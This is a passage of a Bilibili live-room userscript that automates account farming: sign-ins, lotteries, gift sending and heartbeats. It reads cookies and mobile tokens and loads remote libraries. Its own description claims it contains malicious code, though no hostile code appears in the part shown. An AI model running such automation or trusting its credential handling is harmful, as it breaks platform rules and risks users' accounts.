// ==UserScript==
// @name         Bilibili直播间挂机助手-魔改
// @namespace    SeaLoong
// @version      2.4.5.12
// @description  Bilibili直播间自动签到，领瓜子，参加抽奖，完成任务，送礼，自动点亮勋章，挂小心心等，包含恶意代码
// @author       SeaLoong,lzghzr,pjy612
// @updateURL    https://github.com.cnpmjs.org/pjy612/Bilibili-LRHH/raw/master/Bilibili%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B-%E9%AD%94%E6%94%B9.user.js
// @downloadURL  https://github.com.cnpmjs.org/pjy612/Bilibili-LRHH/raw/master/Bilibili%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B-%E9%AD%94%E6%94%B9.user.js
// @homepageURL  https://github.com/pjy612/Bilibili-LRHH
// @supportURL   https://github.com/pjy612/Bilibili-LRHH/issues
// @include      /https?:\/\/live\.bilibili\.com\/[blanc\/]?[^?]*?\d+\??.*/
// @include      /https?:\/\/api\.live\.bilibili\.com\/_.*/
// @require      https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js
// @require      https://cdn.jsdelivr.net/gh/pjy612/Bilibili-LRHH/BilibiliAPI_Plus.js
// @require      https://cdn.jsdelivr.net/gh/SeaLoong/Bilibili-LRHH/OCRAD.min.js
// @require      https://cdn.jsdelivr.net/gh/lzghzr/TampermonkeyJS/libBilibiliToken/libBilibiliToken.user.js
// @run-at       document-idle
// @license      MIT License
// @connect      passport.bilibili.com
// @connect      api.live.bilibili.com
// @grant        GM_xmlhttpRequest
// ==/UserScript==
/*
瓜子初始化失败问题自行替换上方对应OCRAD源
[github源]
// @require      https://raw.githubusercontent.com/SeaLoong/Bilibili-LRHH/master/OCRAD.min.js
[gitee源]
// @require      https://gitee.com/SeaLoong/Bilibili-LRHH/raw/master/OCRAD.min.js
[腾讯云源]
// @require      https://js-1258131272.file.myqcloud.com/OCRAD.min.js
[jsDelivr源]
// @require      https://cdn.jsdelivr.net/gh/SeaLoong/Bilibili-LRHH/OCRAD.min.js
*/
(function BLRHH_Plus() {
    'use strict';
    const NAME = 'BLRHH-Plus';
    const VERSION = '2.4.5.12';
    try{
        var tmpcache = JSON.parse(localStorage.getItem(`${NAME}_CACHE`));
        const t = Date.now() / 1000;
        if (t - tmpcache.unique_check >= 0 && t - tmpcache.unique_check <= 60) {
            console.error('魔改脚本重复运行')
            return;
        }
    }catch(e){
    }
    let scriptRuning = false;
    let API;
    let TokenUtil;
    let Token;
    const window = typeof unsafeWindow === 'undefined' ? window : unsafeWindow;
    const isSubScript = () => window.frameElement && window.parent[NAME] && window.frameElement[NAME];

    const DEBUGMODE = false || window.top.localStorage.getItem('BLRHH-DEBUG');
    const DEBUG = (sign, ...data) => {
        if (!DEBUGMODE) return;
        let d = new Date();
        d = `[${NAME}]${(isSubScript() ? 'SubScript:' : '')}[${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}:${d.getMilliseconds()}]`;
        if (data.length === 1) console.debug(d, `${sign}:`, data[0]);
        else console.debug(d, `${sign}:`, data);
    };

    let CONFIG;
    let CACHE;
    let Info = {
        short_id: undefined,
        roomid: undefined,
        uid: undefined,
        ruid: undefined,
        rnd: undefined,
        csrf_token: undefined,
        visit_id: undefined,
        silver: undefined,
        gold: undefined,
        mobile_verify: undefined,
        identification: undefined,
        gift_list: undefined,
        gift_list_str: '礼物对照表',
        blocked: false,
        awardBlocked:false,
        appToken: undefined
    };
    const getAccessToken = async () => {
        if(Token && TokenUtil){
            const userToken = await Token.getToken();
            if (userToken === undefined){
                console.error('未获取到移动端token,部分功能可能失效');
            }
            return userToken;
        }
        return null;
    };

    const tz_offset = new Date().getTimezoneOffset() + 480;

    const ts_s = () => Math.round(ts_ms() / 1000);

    const ts_ms = () => Date.now();

    const getCookie = (name) => {
        let arr;
        const reg = new RegExp(`(^| )${name}=([^;]*)(;|$)`);
        if ((arr = document.cookie.match(reg))) {
            return unescape(arr[2]);
        } else {
            return null;
        }
    };

    const delayCall = (callback, delay = 10e3) => {
        const p = $.Deferred();
        setTimeout(() => {
            const t = callback();
            if (t && t.then) t.then((arg1, arg2, arg3, arg4, arg5, arg6) => p.resolve(arg1, arg2, arg3, arg4, arg5, arg6));
            else p.resolve();
        }, delay);
        return p;
    };

    const checkNewDay = (ts) => {
        // 检查是否为新的一天，以UTC+8为准
        const t = new Date(ts);
        t.setMinutes(t.getMinutes() + tz_offset);
        t.setHours(0, 0, 0, 0);
        const d = new Date();
        d.setMinutes(t.getMinutes() + tz_offset);
        return (d - t > 86400e3);
    };

    const runTomorrow = (callback) => {
        const t = new Date();
        t.setMinutes(t.getMinutes() + tz_offset);
        t.setDate(t.getDate() + 1);
        t.setHours(0, 1, 0, 0);
        t.setMinutes(t.getMinutes() - tz_offset);
        setTimeout(callback, t - ts_ms());
        DEBUG('runTomorrow', t.toString());
    };
    if (!isSubScript()) {
        const runUntilSucceed = (callback, delay = 0, period = 100) => {
            setTimeout(() => {
                if (!callback()) runUntilSucceed(callback, period, period);
            }, delay);
        };

        const addCSS = (context) => {
            const style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = context;
            document.getElementsByTagName('head')[0].appendChild(style);
        };

        const Essential = {
            init: () => {
                return Essential.Toast.init().then(() => {
                    return Essential.AlertDialog.init().then(() => {
                        return Essential.Config.init().then(() => {
                            Essential.DataSync.init();
                            Essential.Cache.load();
                            Essential.Config.load();
                        });
                    });
                });
            },
            Toast: {
                init: () => {
                    try {
                        const toastList = [];
                        window.toast = (msg, type = 'info', timeout = 3e3) => {
                            let d = new Date().toLocaleTimeString();
                            switch (type) {
                                case 'success':
                                case 'info':
                                    console.info(`[${NAME}][${d}]${msg}`);
                                    break;
                                case 'caution':
                                    console.warn(`[${NAME}][${d}]${msg}`);
                                    break;
                                case 'error':
                                    console.error(`[${NAME}][${d}]${msg}`);
                                    break;
                                default:
                                    type = 'info';
                                    console.log(`[${NAME}][${d}]${msg}`);
                            }
                            if (CONFIG && !CONFIG.SHOW_TOAST) return;
                            const a = $(`<div class="link-toast ${type} fixed"><span class="toast-text">${msg}</span></div>`)[0];
                            document.body.appendChild(a);
                            a.style.top = (document.body.scrollTop + toastList.length * 40 + 10) + 'px';
                            a.style.left = (document.body.offsetWidth + document.body.scrollLeft - a.offsetWidth - 5) + 'px';
                            toastList.push(a);
                            setTimeout(() => {
                                a.className += ' out';
                                setTimeout(() => {
                                    toastList.shift();
                                    toastList.forEach((v) => {
                                        v.style.top = (parseInt(v.style.top, 10) - 40) + 'px';
                                    });
                                    $(a).remove();
                                }, 200);
                            }, timeout);
                        };
                        return $.Deferred().resolve();
                    } catch (err) {
                        console.error(`[${NAME}]初始化浮动提示时出现异常`);
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                }
            }, // Need Init
            AlertDialog: {
                init: () => {
                    try {
                        const div_background = $(`<div id="${NAME}_alertdialog"/>`);
                        div_background[0].style = 'display: table;position: fixed;height: 100%;width: 100%;top: 0;left: 0;font-size: 12px;z-index: 10000;background-color: rgba(0,0,0,.5);';
                        const div_position = $('<div/>');
                        div_position[0].style = 'display: table-cell;vertical-align: middle;';
                        const div_style = $('<div/>');
                        div_style[0].style = 'position: relative;top: 50%;width: 40%;padding: 16px;border-radius: 5px;background-color: #fff;margin: 0 auto;';
                        div_position.append(div_style);
                        div_background.append(div_position);

                        const div_title = $('<div/>');
                        div_title[0].style = 'position: relative;padding-bottom: 12px;';
                        const div_title_span = $('<span>提示</span>');
                        div_title_span[0].style = 'margin: 0;color: #23ade5;font-size: 16px;';
                        div_title.append(div_title_span);
                        div_style.append(div_title);

                        const div_content = $('<div/>');
                        div_content[0].style = 'display: inline-block;vertical-align: top;font-size: 14px;overflow: auto;height: 300px;';
                        div_style.append(div_content);

                        const div_button = $('<div/>');
                        div_button[0].style = 'position: relative;height: 32px;margin-top: 12px;';
                        div_style.append(div_button);

                        const button_ok = $('<button><span>确定</span></button>');
                        button_ok[0].style = 'position: absolute;height: 100%;min-width: 68px;right: 0;background-color: #23ade5;color: #fff;border-radius: 4px;font-size: 14px;border: 0;cursor: pointer;';
                        div_button.append(button_ok);

                        window.alertdialog = (title, content) => {
                            div_title_span.html(title);
                            div_content.html(content);
                            button_ok.click(() => {
                                $(`#${NAME}_alertdialog`).remove();
                            });
                            $('body > .link-popup-ctnr').first().append(div_background);
                        };
                        return $.Deferred().resolve();
                    } catch (err) {
                        window.toast('初始化帮助界面时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                }
            }, // Need Init After Toast.init
            Config: {
                CONFIG_DEFAULT: {
                    DD_BP:true,
                    DD_DM_STORM:true,
                    AUTO_SIGN: true,
                    AUTO_TREASUREBOX: true,
                    AUTO_GROUP_SIGN: true,
                    MOBILE_HEARTBEAT: true,
                    AUTO_LOTTERY: true,
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE:"",
                        GIFT_LOTTERY: true,
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: 0
                        },
                        GUARD_AWARD: true,
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: 1,
                            CHANGE_ROOM_INTERVAL: 60
                        },
                        PK_AWARD:true,
                        MATERIAL_OBJECT_LOTTERY: true,
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: 10,
                            IGNORE_QUESTIONABLE_LOTTERY: true
                        },
                        STORM:false,
                        STORM_CONFIG:{
                            STORM_QUEUE_SIZE:3,
                            STORM_MAX_COUNT:100,
                            STORM_ONE_LIMIT:180,
                        },
                        HIDE_POPUP: true
                    },
                    AUTO_TASK: true,
                    AUTO_GIFT: false,
                    AUTO_GIFT_CONFIG: {
                        ROOMID: [0],
                        EXCLUDE_ROOMID:[0],
                        GIFT_INTERVAL:10,
                        GIFT_LIMIT:86400,
                        GIFT_SORT:true,
                        AUTO_LIGHT:true,
                        SEND_ALL: false
                    },
                    SILVER2COIN: false,
                    AUTO_DAILYREWARD: true,
                    AUTO_DAILYREWARD_CONFIG: {
                        LOGIN: true,
                        WATCH: true,
                        COIN: false,
                        COIN_CONFIG: {
                            NUMBER: 5
                        },
                        SHARE: true
                    },
                    SHOW_TOAST: true
                },
                NAME: {
                    DD_BP:'BiliPush推送',
                    DD_DM_STORM:'DD弹幕风暴',
                    AUTO_SIGN: '自动签到',
                    AUTO_TREASUREBOX: '自动领取银瓜子',
                    AUTO_GROUP_SIGN: '自动应援团签到',
                    MOBILE_HEARTBEAT: '移动端心跳',
                    AUTO_LOTTERY: '自动抽奖',
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE:'休眠时间',
                        GIFT_LOTTERY: '礼物抽奖',
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: '刷新间隔'
                        },
                        GUARD_AWARD: '舰队领奖',
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: '监听倍数',
                            CHANGE_ROOM_INTERVAL: '换房间隔'
                        },
                        PK_AWARD:'乱斗领奖',
                        MATERIAL_OBJECT_LOTTERY: '实物抽奖',
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: '检查间隔',
                            IGNORE_QUESTIONABLE_LOTTERY: '忽略存疑的抽奖'
                        },
                        STORM:'节奏风暴',
                        STORM_CONFIG:{
                            STORM_QUEUE_SIZE:'同时参与数',
                            STORM_MAX_COUNT:'最大次数',
                            STORM_ONE_LIMIT:'尝试间隔',
                        },
                        HIDE_POPUP: '隐藏抽奖提示框'
                    },
                    AUTO_TASK: '自动完成任务',
                    AUTO_GIFT: '自动送礼物',
                    AUTO_GIFT_CONFIG: {
                        ROOMID: '优先房间号',
                        EXCLUDE_ROOMID:'排除房间号',
                        GIFT_INTERVAL:'检查间隔(分钟)',
                        GIFT_SORT:'优先高等级',
                        GIFT_LIMIT:'到期时间(秒)',
                        AUTO_LIGHT:'自动点亮勋章',
                        SEND_ALL: '送满全部勋章'
                    },
                    SILVER2COIN: '银瓜子换硬币',
                    AUTO_DAILYREWARD: '自动每日奖励',
                    AUTO_DAILYREWARD_CONFIG: {
                        LOGIN: '登录',
                        WATCH: '观看',
                        COIN: '投币',
                        COIN_CONFIG: {
                            NUMBER: '数量'
                        },
                        SHARE: '分享'
                    },
                    SHOW_TOAST: '显示浮动提示'
                },
                PLACEHOLDER: {
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE:'时间范围03:00-08:00',
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: '单位(分钟)'
                        },
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: '1~5，默认1',
                            CHANGE_ROOM_INTERVAL: '单位(分钟)'
                        },
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: '单位(分钟)'
                        },
                        STORM_CONFIG:{
                            STORM_QUEUE_SIZE:'',
                            STORM_MAX_COUNT:'',
                            STORM_ONE_LIMIT:'单位（毫秒）',
                        },
                    },
                    AUTO_GIFT_CONFIG: {
                        ROOMID: '为0不送礼',
                        GIFT_DEFAULT: '为空默认不送',
                        GIFT_ALLOWED: '为空允许所有'
                    }
                },
                HELP: {
                    DD_BP:'魔改助手核心监控，启用后由服务器推送全区礼物/舰队/PK（但需要验证使用者身份并带有DD传送门等附加功能）',
                    DD_DM_STORM:'DD弹幕风暴（娱乐功能），配合DD传送门进行人力节奏风暴，用于活跃直播间气氛。',
                    MOBILE_HEARTBEAT: '发送移动端心跳数据包，可以完成双端观看任务',
                    AUTO_LOTTERY: '设置是否自动参加抽奖功能，包括礼物抽奖、活动抽奖、实物抽奖<br>会占用更多资源并可能导致卡顿，且有封号风险',
                    AUTO_LOTTERY_CONFIG: {
                        SLEEP_RANGE:'休眠时间范围，英文逗号分隔<br>例如：<br>3:00-8:00,16:50-17:30<br>表示 3:00-8:00和16:50-17:30不进行礼物检测。<br>小时为当天只能为0-23,如果要转钟请单独配置aa:aa-23:59,00:00-bb:bb',
                        GIFT_LOTTERY: '包括小电视、摩天大楼、C位光环及其他可以通过送礼触发广播的抽奖<br>内置几秒钟的延迟',
                        GIFT_LOTTERY_CONFIG: {
                            REFRESH_INTERVAL: '设置页面自动刷新的时间间隔，设置为0则不启用，单位为分钟<br>太久导致页面崩溃将无法正常运行脚本'
                        },
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: '设置在各大分区中的每一个分区监听的直播间的数量，1~5之间的一个整数<br>可能导致占用大量内存或导致卡顿',
                            CHANGE_ROOM_INTERVAL: '设置在多久之后改变监听的房间，单位为分钟，0表示不改变'
                        },
                        MATERIAL_OBJECT_LOTTERY: '部分房间设有实物奖励抽奖，脚本使用穷举的方式检查是否有实物抽奖<br>请注意中奖后记得及时填写相关信息领取实物奖励',
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: '每次穷举实物抽奖活动ID的时间间隔，单位为分钟',
                            IGNORE_QUESTIONABLE_LOTTERY: '对部分实物抽奖的标题存在疑问，勾选后不参加这部分抽奖'
                        },
                        STORM:'尝试参与节奏风暴<br>如果出现验证码提示的话请尝试实名制后再试',
                        STORM_CONFIG:{
                            STORM_QUEUE_SIZE:'允许同时参与的风暴次数<br>超过容量时自动丢弃最早参与的风暴，避免同时请求过多造成风控',
                            STORM_MAX_COUNT:'单个风暴最大尝试次数',
                            STORM_ONE_LIMIT:'单个风暴参与次数间隔（毫秒）',
                        },
                        HIDE_POPUP: '隐藏位于聊天框下方的抽奖提示框<br>注意：脚本参加抽奖后，部分抽奖仍然可以手动点击参加，为避免小黑屋，不建议点击'
                    },
                    AUTO_GIFT_CONFIG: {
                        ROOMID: '数组,优先送礼物的直播间ID(即地址中live.bilibili.com/后面的数字), 设置为0则无优先房间，小于0也视为0（因为你没有0的勋章）<br>例如：17171,21438956<br>不管[优先高等级]如何设置，会根据[送满全部勋章]（补满或者只消耗当日到期）条件去优先送17171的，再送21438956<br>之后根据[优先高等级]决定送高级还是低级',
                        EXCLUDE_ROOMID: '数组,排除送礼的直播间ID(即地址中live.bilibili.com/后面的数字)，填写的直播间不会自动送礼',
                        GIFT_INTERVAL:'检查间隔(分钟)',
                        GIFT_SORT:'打钩优先赠送高等级勋章，不打勾优先赠送低等级勋章',
                        GIFT_LIMIT:'到期时间范围（秒），86400为1天，时间小于1天的会被送掉',
                        GIFT_DEFAULT: () => (`设置默认送的礼物类型编号，多个请用英文逗号(,)隔开，为空则表示默认不送出礼物<br>${Info.gift_list_str}`),
                        GIFT_ALLOWED: () => (`设置允许送的礼物类型编号(任何未在此列表的礼物一定不会被送出!)，多个请用英文逗号(,)隔开，为空则表示允许送出所有类型的礼物<br><br>${Info.gift_list_str}`),
                        SEND_ALL: '打钩 送满全部勋章，否则 送出包裹中今天到期的礼物(会送出"默认礼物类型"之外的礼物，若今日亲密度已满则不送)',
                        AUTO_LIGHT:'自动用小心心点亮亲密度未满且未被排除的灰掉的勋章'
                    },
                    SILVER2COIN: '用银瓜子兑换硬币，每天只能兑换一次<br>700银瓜子兑换1个硬币',
                    AUTO_DAILYREWARD: '自动完成每日经验的任务',
                    AUTO_DAILYREWARD_CONFIG: {
                        LOGIN: '自动完成登录任务(凌晨的时候不一定能完成)',
                        WATCH: '自动完成观看任务(凌晨的时候不一定能完成)',
                        COIN: '对你关注的动态中最新几期的视频投币，直到投完设定的数量',
                        SHARE: '自动分享你关注的动态中最新一期的视频(可以完成任务，但实际上不会出现这条动态)'
                    },
                    SHOW_TOAST: '选择是否显示浮动提示，但提示信息依旧会在控制台显示'
                },
                showed: false,
                init: () => {
                    try {
                        const p = $.Deferred();
                        const getConst = (itemname, obj) => {
                            if (itemname.indexOf('-') > -1) {
                                const objname = itemname.match(/(.+?)-/)[1];
                                if (objname && obj[objname]) return getConst(itemname.replace(`${objname}-`, ''), obj[objname]);
                                else return undefined;
                            }
                            if (typeof obj[itemname] === 'function') return obj[itemname]();
                            return obj[itemname];
                        };
                        const recur = (cfg, element, parentname = undefined) => {
                            for (const item in cfg) {
                                let itemname;
                                if (parentname) itemname = `${parentname}-${item}`;
                                else itemname = item;
                                const id = `${NAME}_config_${itemname}`;
                                const name = getConst(itemname, Essential.Config.NAME);
                                const placeholder = getConst(itemname, Essential.Config.PLACEHOLDER);
                                let e;
                                let h;
                                if (getConst(itemname, Essential.Config.HELP)) h = $(`<div class="${NAME}_help" id="${id}_help" style="display: inline;"><span class="${NAME}_clickable">?</span></div>`);
                                switch ($.type(cfg[item])) {
                                    case 'number':
                                    case 'string':
                                        e = $(`<div class="${NAME}_setting_item"></div>`);
                                        e.html(`<label style="display: inline;" title="${name}">${name}<input id="${id}" type="text" class="${NAME}_input_text" placeholder="${placeholder}"></label>`);
                                        if (h) e.append(h);
                                        element.append(e);
                                        break;
                                    case 'boolean':
                                        e = $(`<div class="${NAME}_setting_item"></div>`);
                                        e.html(`<label style="display: inline;" title="${name}"><input id="${id}" type="checkbox" class="${NAME}_input_checkbox">${name}</label>`);
                                        if (h) e.append(h);
                                        element.append(e);
                                        if (getConst(`${itemname}_CONFIG`, Essential.Config.NAME)) $(`#${id}`).addClass(`${NAME}_control`);
                                        break;
                                    case 'array':
                                        e = $(`<div class="${NAME}_setting_item"></div>`);
                                        e.html(`<label style="display: inline;" title="${name}">${name}<input id="${id}" type="text" class="${NAME}_input_text" placeholder="${placeholder}"></label>`);
                                        if (h) e.append(h);
                                        element.append(e);
                                        break;
                                    case 'object':
                                        e = $(`<div id="${id}" style="margin: 0px 0px 8px 12px;"/>`);
                                        element.append(e);
                                        recur(cfg[item], e, itemname);
                                        break;
                                }
                            }
                        };
                        runUntilSucceed(() => {
                            try {
                                let findSp = false;
                                let blancFrames = $('iframe');
                                if(blancFrames && blancFrames.length>0){
                                    blancFrames.each((k,v)=>{
                                        if(v.src.includes('/blanc/')){
                                            findSp = true;
                                            window.toast('检查到特殊活动页，尝试跳转...', 'info',5e3);
                                            setTimeout(()=>{
                                                location.replace(v.src);
                                            },10);
                                            return false;
                                        }
                                    });
                                }
                                if(findSp) {
                                    p.reject();
                                    return true;
                                }
                                //if (!$('#sidebar-vm div.side-bar-cntr')[0]) return false;
                                if (!$('#sidebar-vm')[0]) return false;
                                // 加载css
                                addCSS(`.${NAME}_clickable {font-size: 12px;color: #0080c6;cursor: pointer;text-decoration: underline;}
.${NAME}_setting_item {margin: 6px 0px;}
.${NAME}_input_checkbox {vertical-align: bottom;}
.${NAME}_input_text {margin: -2px 0 -2px 4px;padding: 0;}`);
                                // 绘制右下角按钮
                                const div_button_span = $('<span>魔改助手设置</span>');
                                div_button_span[0].style = 'font-size: 12px;line-height: 16px;color: #0080c6;';
                                const div_button = $('<div/>');
                                div_button[0].style = 'cursor: pointer;text-align: center;padding: 0px;';
                                const div_side_bar = $('<div/>');
                                div_side_bar[0].style = 'width: 56px;height: 32px;overflow: hidden;position: fixed;right: 0px;bottom: 10%;padding: 4px 4px;background-color: rgb(255, 255, 255);z-index: 10001;border-radius: 8px 0px 0px 8px;box-shadow: rgba(0, 85, 255, 0.0980392) 0px 0px 20px 0px;border: 1px solid rgb(233, 234, 236);';
                                div_button.append(div_button_span);
                                div_side_bar.append(div_button);
                                //$('#sidebar-vm div.side-bar-cntr').first().after(div_side_bar);
                                $('#sidebar-vm').after(div_side_bar);
                                // 绘制设置界面
                                const div_position = $('<div/>');
                                div_position[0].style = 'display: none;position: fixed;height: 300px;width: 350px;bottom: 5%;z-index: 9999;';
                                const div_style = $('<div/>');
                                div_style[0].style = 'display: block;overflow: hidden;height: 300px;width: 350px;border-radius: 8px;box-shadow: rgba(106, 115, 133, 0.219608) 0px 6px 12px 0px;border: 1px solid rgb(233, 234, 236);background-color: rgb(255, 255, 255);';
                                div_position.append(div_style);
                                document.body.appendChild(div_position[0]);
                                // 绘制标题栏及按钮
                                const div_title = $('<div/>');
                                div_title[0].style = 'display: block;border-bottom: 1px solid #E6E6E6;height: 35px;line-height: 35px;margin: 0;padding: 0;overflow: hidden;';
                                const div_title_span = $('<span style="float: left;display: inline;padding-left: 8px;font: 700 14px/35px SimSun;">Bilibili直播间挂机助手-魔改</span>');
                                const div_title_button = $('<div/>');
                                div_title_button[0].style = 'float: right;display: inline;padding-right: 8px;';
                                const div_button_line = $(`<div style="display: inline;"></div>`);
                                const span_button_state = $(`<span class="${NAME}_clickable">统计</span>`)
                                div_button_line.append(span_button_state);
                                div_button_line.append("&nbsp;&nbsp;");
                                const span_button_clear = $(`<span class="${NAME}_clickable">清除缓存</span>`)
                                div_button_line.append(span_button_clear);
                                div_title_button.append(div_button_line);
                                div_title.append(div_title_span);
                                div_title.append(div_title_button);
                                div_style.append(div_title);
                                // 绘制设置项内容
                                const div_context_position = $('<div/>');
                                div_context_position[0].style = 'display: block;position: absolute;top: 36px;width: 100%;height: calc(100% - 36px);';
                                const div_context = $('<div/>');
                                div_context[0].style = 'height: 100%;overflow: auto;padding: 0 12px;margin: 0px;';
                                div_context_position.append(div_context);
                                div_style.append(div_context_position);
                                recur(Essential.Config.CONFIG_DEFAULT, div_context);
                                // 设置事件
                                div_button.click(() => {
                                    if (!Essential.Config.showed) {
                                        Essential.Config.load();
                                        div_position.css('right', div_side_bar[0].clientWidth + 'px');
                                        div_position.show();
                                        div_button_span.text('点击保存设置');
                                        div_button_span.css('color', '#ff8e29');
                                    } else {
                                        Essential.Config.save();
                                        div_position.hide();
                                        div_button_span.text('魔改助手设置');
                                        div_button_span.css('color', '#0080c6');
                                        BiliPushUtils.Check.sleepTimeRangeBuild();
                                        if(CONFIG.DD_BP){
                                            BiliPush.connectWebsocket(true);
                                        }else if(BiliPush.gsocket) {
                                            BiliPush.gsocket.close();
                                        }
                                    }
                                    Essential.Config.showed = !Essential.Config.showed;
                                });
                                span_button_clear.click(() => {
                                    Essential.Cache.clear();
                                    location.reload();
                                });
                                span_button_state.click(()=>{
                                    Statistics.showDayGifts();
                                });
                                const getItemByElement = (element) => element.id.replace(`${NAME}_config_`, '');
                                const getItemByHelpElement = (element) => element.id.replace(`${NAME}_config_`, '').replace('_help', '');
                                $(`.${NAME}_help`).click(function () {
                                    window.alertdialog('说明', getConst(getItemByHelpElement(this), Essential.Config.HELP));
                                });
                                $(`.${NAME}_control`).click(function () {
                                    if ($(this).is(':checked')) {
                                        $(`#${NAME}_config_${getItemByElement(this)}_CONFIG`).show();
                                    } else {
                                        $(`#${NAME}_config_${getItemByElement(this)}_CONFIG`).hide();
                                    }
                                });
                                p.resolve();
                                return true;
                            } catch (err) {
                                window.toast('初始化设置界面时出现异常', 'error');
                                console.error(`[${NAME}]`, err);
                                p.reject();
                                return true;
                            }
                        });
                        return p;
                    } catch (err) {
                        window.toast('初始化设置时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                },
                recurLoad: (cfg, parentname = undefined, cfg_default = Essential.Config.CONFIG_DEFAULT) => {
                    for (const item in cfg_default) {
                        let itemname;
                        if (parentname) itemname = `${parentname}-${item}`;
                        else itemname = item;
                        const e = $(`#${NAME}_config_${itemname}`);
                        if (!e[0]) continue;
                        if (cfg[item] === undefined) cfg[item] = Essential.Config._copy(cfg_default[item]);
                        switch ($.type(cfg[item])) {
                            case 'number':
                            case 'string':
                                e.val(cfg[item]);
                                break;
                            case 'boolean':
                                e.prop('checked', cfg[item]);
                                if (e.is(':checked')) $(`#${NAME}_config_${itemname}_CONFIG`).show();
                                else $(`#${NAME}_config_${itemname}_CONFIG`).hide();
                                break;
                            case 'array':
                                e.val(cfg[item].join(','));
                                break;
                            case 'object':
                                Essential.Config.recurLoad(cfg[item], itemname, cfg_default[item]);
                                break;
                        }
                    }
                },
                recurSave: (cfg, parentname = undefined, cfg_default = Essential.Config.CONFIG_DEFAULT) => {
                    if (Object.prototype.toString.call(cfg) !== '[object Object]') return cfg;
                    for (const item in cfg_default) {
                        let itemname;
                        if (parentname) itemname = `${parentname}-${item}`;
                        else itemname = item;
                        const e = $(`#${NAME}_config_${itemname}`);
                        if (!e[0]) continue;
                        switch ($.type(cfg[item])) {
                            case 'string':
                                cfg[item] = e.val() || '';
                                break;
                            case 'number':
                                cfg[item] = parseFloat(e.val());
                                if (isNaN(cfg[item])) cfg[item] = 0;
                                break;
                            case 'boolean':
                                cfg[item] = e.is(':checked');
                                break;
                            case 'array':
                                var value = e.val().replace(/(\s|\u00A0)+/, '');
                                if (value === '') {
                                    cfg[item] = [];
                                }
                                else{
                                    cfg[item] = value.split(',');
                                    cfg[item].forEach((v, i) => {
                                        cfg[item][i] = parseFloat(v);
                                        if (isNaN(cfg[item][i])) cfg[item][i] = 0;
                                    });
                                }
                                break;
                            case 'object':
                                cfg[item] = Essential.Config.recurSave(cfg[item], itemname, cfg_default[item]);
                                break;
                        }
                        if (cfg[item] === undefined) cfg[item] = Essential.Config._copy(cfg_default[item]);
                    }
                    return cfg;
                },
                fix: (config) => {
                    // 修正设置项中不合法的参数，针对有输入框的设置项
                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER === undefined) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER;
                    config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = parseInt(config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER, 10);
                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER < 1) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = 1;
                    else if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER > 5) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = 5;

                    if (config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL === undefined) config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL;
                    config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL, 10);
                    if (config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = 0;

                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL === undefined) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL;
                    config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL, 10);
                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = 0;

